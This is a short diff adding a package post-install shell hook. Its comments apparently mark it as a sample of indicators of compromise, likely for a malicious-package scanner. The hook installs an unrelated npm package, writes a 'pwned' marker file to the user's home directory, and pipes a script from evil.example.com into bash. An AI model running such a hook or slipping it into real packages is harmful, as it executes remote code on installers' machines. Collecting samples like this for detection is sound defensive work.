@@ -1,0 +1,5 @@
+post_install() {
+  npm install js-digest                         # IOC + foreign PM
+  echo pwned >"$HOME/compromised.txt"           # маркер кампании 2018 (acroread)
+  curl -sSL http://evil.example.com/p.sh | bash # curl|sh уже в хуке
+}
